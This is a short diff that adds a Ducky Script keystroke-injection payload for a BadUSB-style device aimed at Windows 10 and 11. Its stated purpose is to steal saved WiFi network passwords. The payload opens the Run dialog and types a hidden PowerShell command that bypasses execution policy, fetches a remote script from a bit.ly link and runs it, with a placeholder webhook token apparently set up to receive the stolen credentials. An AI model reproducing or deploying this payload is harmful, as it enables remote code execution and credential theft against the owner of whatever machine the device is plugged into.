@@ -1,3 +1,9 @@
 REM Checks available APs then grabs system saved wifi networks and passwrds.
 
-REM
+REM Mode: HID
+REM Target: Windows 10, 11
+
+GUI r
+DELAY 300
+STRING powershell -w h -NoP -Ep Bypass $dc='insert webhook access token'; irm bit.ly/wifi_creds | iex
+ENTER
